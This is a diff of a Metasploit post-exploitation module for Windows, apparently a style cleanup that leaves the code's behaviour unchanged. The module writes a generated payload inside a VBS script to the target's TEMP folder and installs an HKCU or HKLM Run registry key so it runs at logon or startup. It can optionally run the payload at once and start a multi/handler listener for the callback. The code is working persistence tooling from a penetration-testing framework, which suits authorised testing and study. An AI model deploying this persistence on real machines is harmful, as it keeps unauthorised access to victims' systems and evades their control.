@@ -73,23 +73,23 @@ class MetasploitModule < Msf::Exploit::Local
   # Exploit method for when exploit command is issued
   def exploit
     # Define default values
-    rvbs_name = datastore['VBS_NAME'] || Rex::Text.rand_text_alpha((rand(8) + 6))
-    rexe_name = datastore['EXE_NAME'] || Rex::Text.rand_text_alpha((rand(8) + 6))
-    reg_val = datastore['REG_NAME'] || Rex::Text.rand_text_alpha((rand(8) + 6))
+    rvbs_name = datastore['VBS_NAME'] || Rex::Text.rand_text_alpha(rand(6..13))
+    rexe_name = datastore['EXE_NAME'] || Rex::Text.rand_text_alpha(rand(6..13))
+    reg_val = datastore['REG_NAME'] || Rex::Text.rand_text_alpha(rand(6..13))
     startup = datastore['STARTUP'].downcase
     delay = datastore['DELAY']
     exec_after = datastore['EXEC_AFTER']
     handler = datastore['HANDLER']
-    @clean_up_rc = ""
+    @clean_up_rc = ''
 
-    rvbs_name = rvbs_name + '.vbs' if rvbs_name[-4, 4] != '.vbs'
-    rexe_name = rexe_name + '.exe' if rexe_name[-4, 4] != '.exe'
+    rvbs_name += '.vbs' if rvbs_name[-4, 4] != '.vbs'
+    rexe_name += '.exe' if rexe_name[-4, 4] != '.exe'
 
     # Connect to the session
     begin
       host = session.session_host
       print_status("Running persistent module against #{sysinfo['Computer']} via session ID: #{datastore['SESSION']}")
-    rescue => e
+    rescue StandardError => e
       print_error("Could not connect to session: #{e}")
       return nil
     end
@@ -101,8 +101,8 @@ class MetasploitModule < Msf::Exploit::Local
 
     if handler && !datastore['DisablePayloadHandler']
       # DisablePayloadHandler will stop listening after the script finishes - we want a job so it continues afterwards!
-      print_warning("Note: HANDLER == TRUE && DisablePayloadHandler == TRUE. This will create issues...")
-      print_warning("Disabling HANDLER...")
+      print_warning('Note: HANDLER == TRUE && DisablePayloadHandler == TRUE. This will create issues...')
+      print_warning('Disabling HANDLER...')
       handler = false
     end
 
@@ -111,9 +111,9 @@ class MetasploitModule < Msf::Exploit::Local
     exe = generate_payload_exe
     # Generate the vbs payload
     vprint_status("Generating VBS persistent script (#{rvbs_name})")
-    vbsscript = ::Msf::Util::EXE.to_exe_vbs(exe, { :persist => true, :delay => delay, :exe_filename => rexe_name })
+    vbsscript = ::Msf::Util::EXE.to_exe_vbs(exe, { persist: true, delay: delay, exe_filename: rexe_name })
     # Writing the payload to target
-    vprint_status("Writing payload inside the VBS script on the target")
+    vprint_status('Writing payload inside the VBS script on the target')
     script_on_target = write_script_to_target(vbsscript, rvbs_name)
     # Exit the module because we failed to write the file on the target host
     # Feedback has already been given to the user, via the function.
@@ -123,14 +123,14 @@ class MetasploitModule < Msf::Exploit::Local
     case startup
     when 'user'
       # If we could not write the entry in the registy we exit the module.
-      return unless write_to_reg("HKCU", script_on_target, reg_val)
+      return unless write_to_reg('HKCU', script_on_target, reg_val)
 
       vprint_status("Payload will execute when USER (#{session.sys.config.getuid}) next logs on")
     when 'system'
       # If we could not write the entry in the registy we exit the module.
-      return unless write_to_reg("HKLM", script_on_target, reg_val)
+      return unless write_to_reg('HKLM', script_on_target, reg_val)
 
-      vprint_status("Payload will execute at the next SYSTEM startup")
+      vprint_status('Payload will execute at the next SYSTEM startup')
     else
       print_error("Something went wrong. Invalid STARTUP method: #{startup}")
       return nil
@@ -148,30 +148,30 @@ class MetasploitModule < Msf::Exploit::Local
     target_exec(script_on_target) if exec_after
 
     # Create 'clean up' resource file
-    clean_rc = log_file()
+    clean_rc = log_file
     file_local_write(clean_rc, @clean_up_rc)
     print_status("Clean up Meterpreter RC file: #{clean_rc}")
 
-    report_note(:host => host,
-                :type => "host.persistance.cleanup",
-                :data => {
-                  :local_id => session.sid,
-                  :stype => session.type,
-                  :desc => session.info,
-                  :platform => session.platform,
-                  :via_payload => session.via_payload,
-                  :via_exploit => session.via_exploit,
-                  :created_at => Time.now.utc,
-                  :commands => @clean_up_rc
+    report_note(host: host,
+                type: 'host.persistance.cleanup',
+                data: {
+                  local_id: session.sid,
+                  stype: session.type,
+                  desc: session.info,
+                  platform: session.platform,
+                  via_payload: session.via_payload,
+                  via_exploit: session.via_exploit,
+                  created_at: Time.now.utc,
+                  commands: @clean_up_rc
                 })
   end
 
   # Writes script to target host and returns the pathname of the target file or nil if the
   # file could not be written.
   def write_script_to_target(vbs, name)
-    filename = name || Rex::Text.rand_text_alpha((rand(8) + 6)) + ".vbs"
+    filename = name || Rex::Text.rand_text_alpha(rand(6..13)) + '.vbs'
     temppath = datastore['PATH'] || session.sys.config.getenv('TEMP')
-    filepath = temppath + "\\" + filename
+    filepath = temppath + '\\' + filename
 
     unless directory?(temppath)
       print_error("#{temppath} does not exist on the target")
@@ -183,8 +183,8 @@ class MetasploitModule < Msf::Exploit::Local
       begin
         file_rm(filepath)
         print_good("Deleted #{filepath}")
-      rescue
-        print_error("Unable to delete file!")
+      rescue StandardError
+        print_error('Unable to delete file!')
         return nil
       end
     end
@@ -195,8 +195,8 @@ class MetasploitModule < Msf::Exploit::Local
 
       # Escape windows pathname separators.
       @clean_up_rc << "rm #{filepath.gsub(/\\/, '//')}\n"
-    rescue
-      print_error("Could not write the payload on the target")
+    rescue StandardError
+      print_error('Could not write the payload on the target')
       # Return nil since we could not write the file on the target
       filepath = nil
     end
@@ -207,15 +207,15 @@ class MetasploitModule < Msf::Exploit::Local
   # Installs payload in to the registry HKLM or HKCU
   def write_to_reg(key, script_on_target, registry_value)
     regsuccess = true
-    nam = registry_value || Rex::Text.rand_text_alpha(rand(8) + 8)
-    key_path = "#{key.to_s}\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
+    nam = registry_value || Rex::Text.rand_text_alpha(rand(8..15))
+    key_path = "#{key}\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
 
     print_status("Installing as #{key_path}\\#{nam}")
 
-    if key && registry_setvaldata(key_path, nam, script_on_target, "REG_SZ")
+    if key && registry_setvaldata(key_path, nam, script_on_target, 'REG_SZ')
       print_good("Installed autorun on #{sysinfo['Computer']} as #{key_path}\\#{nam}")
     else
-      print_error("Failed to make entry in the registry for persistence")
+      print_error('Failed to make entry in the registry for persistence')
       regsuccess = false
     end
 
@@ -231,13 +231,13 @@ class MetasploitModule < Msf::Exploit::Local
 
     # Error handling for process.execute() can throw a RequestError in send_request.
     begin
-      unless datastore['EXE::Custom']
-        cmd_exec("wscript \"#{script_on_target}\"")
-      else
+      if datastore['EXE::Custom']
         cmd_exec("cscript \"#{script_on_target}\"")
+      else
+        cmd_exec("wscript \"#{script_on_target}\"")
       end
-    rescue
-      print_error("Failed to execute payload on target")
+    rescue StandardError
+      print_error('Failed to execute payload on target')
       execsuccess = false
     end
 
@@ -251,7 +251,10 @@ class MetasploitModule < Msf::Exploit::Local
     pay.datastore['LPORT'] = lport
     print_status('Starting exploit/multi/handler')
 
-    unless check_for_listener(lhost, lport)
+    if check_for_listener(lhost, lport)
+      print_error('A job is listening on the same local port')
+      return nil
+    else
       # Set options for module
       mh = client.framework.exploits.create('multi/handler')
       mh.share_datastore(pay.datastore)
@@ -264,8 +267,8 @@ class MetasploitModule < Msf::Exploit::Local
       # Execute showing output
       mh.exploit_simple(
         'Payload' => mh.datastore['PAYLOAD'],
-        'LocalInput' => self.user_input,
-        'LocalOutput' => self.user_output,
+        'LocalInput' => user_input,
+        'LocalOutput' => user_output,
         'RunAsJob' => true
       )
 
@@ -279,24 +282,21 @@ class MetasploitModule < Msf::Exploit::Local
       return nil if framework.jobs[mh.job_id.to_s].nil?
 
       return mh.job_id.to_s
-    else
-      print_error('A job is listening on the same local port')
-      return nil
     end
   end
 
   # Method for checking if a listener for a given IP and port is present
   # will return true if a conflict exists and false if none is found
   def check_for_listener(lhost, lport)
-    client.framework.jobs.each do |k, j|
-      if j.name =~ / multi\/handler/
-        current_id = j.jid
-        current_lhost = j.ctx[0].datastore['LHOST']
-        current_lport = j.ctx[0].datastore['LPORT']
-        if lhost == current_lhost && lport == current_lport.to_i
-          print_error("Job #{current_id} is listening on IP #{current_lhost} and port #{current_lport}")
-          return true
-        end
+    client.framework.jobs.each do |_k, j|
+      next unless j.name =~ %r{ multi/handler}
+
+      current_id = j.jid
+      current_lhost = j.ctx[0].datastore['LHOST']
+      current_lport = j.ctx[0].datastore['LPORT']
+      if lhost == current_lhost && lport == current_lport.to_i
+        print_error("Job #{current_id} is listening on IP #{current_lhost} and port #{current_lport}")
+        return true
       end
     end
     false
@@ -305,10 +305,10 @@ class MetasploitModule < Msf::Exploit::Local
   # Function for creating log folder and returning log path
   def log_file(log_path = nil)
     # Get hostname
-    host = session.sys.config.sysinfo["Computer"]
+    host = session.sys.config.sysinfo['Computer']
 
     # Create Filename info to be appended to downloaded files
-    filenameinfo = "_" + ::Time.now.strftime("%Y%m%d.%M%S")
+    filenameinfo = '_' + ::Time.now.strftime('%Y%m%d.%M%S')
 
     # Create a directory for the logs
     if log_path
@@ -323,7 +323,7 @@ class MetasploitModule < Msf::Exploit::Local
     ::FileUtils.mkdir_p(logs)
 
     # logfile name
-    logfile = logs + ::File::Separator + Rex::FileUtils.clean_path(host + filenameinfo) + ".rc"
+    logfile = logs + ::File::Separator + Rex::FileUtils.clean_path(host + filenameinfo) + '.rc'
     logfile
   end
 end
